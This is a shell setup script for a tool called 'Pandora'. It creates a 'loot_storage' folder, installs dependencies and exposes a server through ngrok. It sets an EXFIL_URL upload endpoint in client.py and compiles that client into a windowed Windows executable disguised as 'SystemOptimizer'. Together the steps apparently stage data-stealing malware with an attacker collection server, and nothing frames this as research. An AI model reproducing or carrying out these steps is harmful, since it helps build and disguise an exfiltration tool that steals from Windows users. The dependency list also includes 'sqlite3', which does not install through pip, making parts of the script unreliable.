# 1. Create Project Structure
mkdir -p pandora_project/loot_storage
cd pandora_project

# 2. Create Virtual Environment
python -m venv venv
source venv/Scripts/activate  # For Windows
# source venv/bin/activate    # For Linux/macOS

# 3. Install Required Dependencies
pip install flask tabulate colorama pyinstaller pycryptodome pypiwin32 requests sqlite3

# 4. Ngrok Setup Instructions
echo "-------------------------------------------------------"
echo "STEP 1: OPEN NGROK"
echo "Run: ngrok http 3000"
echo "Copy the 'Forwarding' URL (e.g., https://xyz.ngrok-free.dev)"
echo "-------------------------------------------------------"

# 5. Configuration Reminder
echo "STEP 2: UPDATE CLIENT.PY"
echo "Replace EXFIL_URL in client.py with your Ngrok URL + /upload"
echo "Example: EXFIL_URL = 'https://xyz.ngrok-free.dev/upload'"
echo "-------------------------------------------------------"

# 6. Compilation Command (Windows Target)
echo "STEP 3: COMPILE CLIENT TO EXE"
echo "Run the following command to build the executable:"
echo "pyinstaller --onefile --windowed --name 'SystemOptimizer' client.py"
echo "-------------------------------------------------------"

# 7. Start Server
echo "STEP 4: STARTING PANDORA SERVER..."
# python server.py